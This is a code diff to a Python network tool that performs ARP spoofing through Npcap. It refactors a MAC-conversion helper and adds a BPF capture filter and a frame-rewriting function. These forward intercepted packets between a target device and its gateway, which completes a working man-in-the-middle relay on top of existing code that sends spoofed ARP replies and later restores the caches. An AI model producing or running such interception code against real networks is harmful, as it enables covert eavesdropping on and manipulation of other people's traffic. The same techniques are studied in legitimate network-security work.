@@ -33,6 +33,10 @@ _ETHERNET_MINIMUM_FRAME_LENGTH = 60
 _BROADCAST_MAC = b'\xff\xff\xff\xff\xff\xff'
 
 
+_ETHERTYPE_IPV4_BYTES = b'\x08\x00'
+_MINIMUM_IPV4_FRAME_LENGTH = 34
+
+
 @dataclass(frozen=True, slots=True)
 class ArpSpoofTargets:
     """Target device and gateway address pairing for ARP spoofing."""
@@ -43,7 +47,7 @@ class ArpSpoofTargets:
     gateway_mac: str
 
 
-def _mac_string_to_bytes(mac_string: str) -> bytes:
+def mac_string_to_bytes(mac_string: str) -> bytes:
     """Convert a MAC address string (e.g. `AA:BB:CC:DD:EE:FF`) to 6 raw bytes."""
     return bytes(int(octet, 16) for octet in mac_string.replace('-', ':').split(':'))
 
@@ -188,9 +192,9 @@ def send_arp_spoof_packets(
         host_mac: MAC address of the local interface (the spoofing PC).
         targets: Target device and gateway address pairing.
     """
-    host_mac_bytes = _mac_string_to_bytes(host_mac)
-    target_mac_bytes = _mac_string_to_bytes(targets.target_mac)
-    gateway_mac_bytes = _mac_string_to_bytes(targets.gateway_mac)
+    host_mac_bytes = mac_string_to_bytes(host_mac)
+    target_mac_bytes = mac_string_to_bytes(targets.target_mac)
+    gateway_mac_bytes = mac_string_to_bytes(targets.gateway_mac)
 
     # Tell the gateway: "target_ip is at host_mac"
     frame_to_gateway = build_arp_reply(
@@ -223,8 +227,8 @@ def send_arp_restore_packets(
         targets: Target device and gateway address pairing.
         repeat_count: Number of times to send each restore frame.
     """
-    target_mac_bytes = _mac_string_to_bytes(targets.target_mac)
-    gateway_mac_bytes = _mac_string_to_bytes(targets.gateway_mac)
+    target_mac_bytes = mac_string_to_bytes(targets.target_mac)
+    gateway_mac_bytes = mac_string_to_bytes(targets.gateway_mac)
 
     # Restore gateway ARP table: "target_ip is at target_mac"
     frame_to_gateway = build_arp_reply(
@@ -245,3 +249,81 @@ def send_arp_restore_packets(
     for _ in range(repeat_count):
         pcap_handle.send_packet(frame_to_gateway)
         pcap_handle.send_packet(frame_to_target)
+
+
+def build_arp_spoof_bpf_filter(host_mac: str, targets: ArpSpoofTargets) -> str:
+    """Build a BPF filter string matching IPv4 traffic redirected by ARP spoofing.
+
+    Matches:
+    1. Outbound traffic from the target device directed to our host MAC.
+    2. Inbound traffic from the gateway destined to the target IP directed to our host MAC.
+
+    Args:
+        host_mac: MAC address of the local spoofing host.
+        targets: Target device and gateway address pairing.
+
+    Returns:
+        BPF filter expression for Npcap packet capture.
+    """
+    normalized_host_mac = host_mac.replace('-', ':').lower()
+    normalized_target_mac = targets.target_mac.replace('-', ':').lower()
+    normalized_gateway_mac = targets.gateway_mac.replace('-', ':').lower()
+    return (
+        f'ip and ether dst {normalized_host_mac} and ('
+        f'(ether src {normalized_target_mac}) or '
+        f'(ether src {normalized_gateway_mac} and dst host {targets.target_ip})'
+        ')'
+    )
+
+
+def forward_intercepted_frame(
+    raw_frame: bytes,
+    *,
+    host_mac_bytes: bytes,
+    target_mac_bytes: bytes,
+    target_ip_bytes: bytes,
+    gateway_mac_bytes: bytes,
+) -> bytes | None:
+    """Rewrite Ethernet L2 headers to forward intercepted packets between target and gateway.
+
+    If the frame was sent by the target device to the host MAC:
+    - Destination MAC is rewritten to the gateway MAC.
+    - Source MAC is rewritten to the host MAC.
+
+    If the frame was sent by the gateway to the host MAC for the target IP:
+    - Destination MAC is rewritten to the target MAC.
+    - Source MAC is rewritten to the host MAC.
+
+    Args:
+        raw_frame: The raw link-layer frame received from pcap.
+        host_mac_bytes: 6-byte MAC address of the local interface.
+        target_mac_bytes: 6-byte MAC address of the target device.
+        target_ip_bytes: 4-byte IPv4 address of the target device.
+        gateway_mac_bytes: 6-byte MAC address of the default gateway.
+
+    Returns:
+        The rewritten frame `bytes` ready for injection via `PcapHandle.send_packet()`,
+        or `None` if the frame does not qualify for forwarding.
+    """
+    if len(raw_frame) < _MINIMUM_IPV4_FRAME_LENGTH:
+        return None
+
+    # Check EtherType == 0x0800 (IPv4)
+    if raw_frame[12:14] != _ETHERTYPE_IPV4_BYTES:
+        return None
+
+    # Frame must be addressed to the host MAC
+    if raw_frame[0:6] != host_mac_bytes:
+        return None
+
+    source_mac = raw_frame[6:12]
+
+    # Outbound packet: Target -> Host MAC (intended for Gateway)
+    if source_mac == target_mac_bytes:
+        return gateway_mac_bytes + host_mac_bytes + raw_frame[12:]
+
+    # Inbound packet: Gateway -> Host MAC (intended for Target IP)
+    if source_mac == gateway_mac_bytes and raw_frame[30:34] == target_ip_bytes:
+        return target_mac_bytes + host_mac_bytes + raw_frame[12:]
+
+    return None
